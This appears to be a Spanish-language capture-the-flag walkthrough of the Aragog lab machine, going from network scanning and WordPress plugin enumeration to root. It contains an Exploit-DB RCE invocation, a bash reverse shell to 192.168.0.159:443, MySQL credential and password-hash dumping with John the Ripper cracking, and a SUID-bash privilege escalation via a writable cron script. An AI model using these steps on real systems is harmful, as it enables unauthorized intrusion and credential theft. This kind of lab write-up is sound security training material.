### Tags `wordpress` `pspy` `mysql`

# Reconocimiento (**LINUX**)

Lo primero que hacemos es un **escaneo de equipos** que estén conectados ami red de esta forma:

```ruby
arp-scan -I eth0 --localnet
```

![image](https://github.com/user-attachments/assets/e7813e89-48e9-445d-8b64-0387667f2680)

# Escaneo (**22, 80**)

```css
sudo nmap -p22,80 -sCV <IP> -oN escaneo
```

![image](https://github.com/user-attachments/assets/314358fb-f288-4e35-8ea0-38811821cb24)

# Port 80

Esta es al web que tiene una imagen, nos *descargamos la imagen* para ver si había algo de estenografía pero no.

![image](https://github.com/user-attachments/assets/8eadce0a-cef0-4652-a331-e54244cb87f8)

## Gobuster

Enumeramos directorios y encontramos `/blog`

```ruby
gobuster dir -u http://<IP>  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html 
```

![image](https://github.com/user-attachments/assets/5815384e-fd30-4e1c-8d38-f9b45a30954e)

Entramos y nos encontramos con un **wordpress**, y un dominio `href="http://wordpress.aragog.hogwarts` que lo agregamos al **/etc/hosts** (también agregar `aragog.hogwarts`) 

![image](https://github.com/user-attachments/assets/fd35b325-7831-49f2-8b91-a62e39670d34)


Jugando otra con Gobuster encontramos este `wp-login.php` que por defecto tienen todos los wordpress

```ruby
 gobuster dir -u http://wordpress.aragog.hogwarts/blog/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
```

![image](https://github.com/user-attachments/assets/4a3f9a48-e7ec-4790-99a0-c256394e8b11)

# Wpscan

Ahora lo que hacemos es que como tenemos un **CMS wordpress**., jugamos con la herramienta `wpsacn` para que nos enumere plugins de manera agresiva

```ruby
wpscan --url http://wordpress.aragog.hogwarts/blog/ --plugins-detection aggressive 
```

Nos ha encontrado 2 el `akismet` que suele estar en todos los wordpress y también nos encontró el `wp-file-manager` 

![image](https://github.com/user-attachments/assets/1182f715-8b8f-4220-9334-4322b270936b)

Si observamos bien ahí nos dice que la última versión del plugin es la `8.0` y que la máquina tiene la `6.0` por ende esta desactualizada

![image](https://github.com/user-attachments/assets/1111ad3b-5ed6-4285-a2eb-505243ee77a2)

Lo que hacemos es buscar por Google y encontramos este [Exploit](https://www.exploit-db.com/exploits/51224) y lo que hacemos es descargárnoslo y poner: 

```ruby
python3 ./51224.py http://wordpress.aragog.hogwarts/blog id 
```

![image](https://github.com/user-attachments/assets/94b82743-e5c8-49ca-b8df-b5f83abbcb3a)

Ahora nos mandamos una Reverse-Shell de esta forma:

```ruby
python3 ./51224.py http://wordpress.aragog.hogwarts/blog/ "bash -c 'bash -i >& /dev/tcp/192.168.0.159/443 0>&1'"
```

![image](https://github.com/user-attachments/assets/add8197b-fd57-4e18-a55e-0e06f254e369)

Hacemos el tratamiento de la `TTY`

```ruby
script /dev/null -c bash
Ctrl + z
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 42 columns 189
```

# Escalada (``hagrid98``)

Tenemos la primera flag

![image](https://github.com/user-attachments/assets/9e28c6e5-146c-47e0-9471-8d87a4bbb6e8)


### Mysql

Enumerando encontramos credenciales en `/etc/wordpress/` para la base de datos ---> `root:mySecr3tPass`

![image](https://github.com/user-attachments/assets/828bf7da-aad8-4e1c-9621-a8607fe2568c)

Entramos dentro poniendo

```css
mysql -u root -p
```

 - Comandos:
	- `show databses` : listamos las bases de datos existentes
	- `use wordpress` : para meternos dentro de la base de datos Wordpress
	- `show tables` : para que lista las tablas dentro de esa base de datos


![image](https://github.com/user-attachments/assets/29c5b66e-7d61-44c0-9178-4ab8f712fe7e)

- Una ves nos listó las tablas queremos:
	- `describe wp_users` : que me describa que tipo de tabla es, que campos contiene, que son , etc
	- `select user_login,user_pass from wp_users` : para que me dumpee todo dentro de esos parámetros de la tabla seleccionada


![image](https://github.com/user-attachments/assets/3a4085fb-0fed-4488-8376-36e5d7035e0c)

### John The Ripper

Nos copiamos el hash para romperlo y obtener la contraseña en texto plano

```ruby
nano hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash 
```

![image](https://github.com/user-attachments/assets/c52d8937-c1a6-43ba-ac56-827a49dc1816)
![image](https://github.com/user-attachments/assets/994c75c9-06c1-412b-8ea1-de25797a2f5c)

# Escalada ``ROOT``

- Lo que hacemos es jugar con [Pspy64](https://github.com/DominicBreuker/pspy/releases) para que nos reporte todas la tareas que se están ejecutando por detrás.
	- Nos lo descargamos, le damos permisos y lo transferimos a la máquina víctima

![image](https://github.com/user-attachments/assets/40a61ed7-2fb4-4c34-8d9a-edac7e2fc13e)
![image](https://github.com/user-attachments/assets/1289edc5-55d0-4ab8-97e5-4d07aded8bde)

Lo ejecutamos así:

```css
./pspy64
```

Y observamos esto:

![image](https://github.com/user-attachments/assets/e9ed9d20-11cd-4ea1-8d3c-28fe5baf1794)

Como es una tarea  que la esta ejecutando root  y hace un `/bin/bash` hacemos lo siguiente

![image](https://github.com/user-attachments/assets/0cba1633-46b0-4116-b09e-c6cdcd8a793e)

Como vimos que éramos los **propietarios de ese script** lo que hicimos es convertir en ``SUID`` la bash:

```ruby
nano .backup.sh
chmod u+s /bin/bash
```

![image](https://github.com/user-attachments/assets/cc953029-b7d6-4eee-9fe0-074ae219af9f)

Y tenemos la última flag siendo `root`

![image](https://github.com/user-attachments/assets/b62dafd5-83c1-4c19-985c-3af91aacc326)





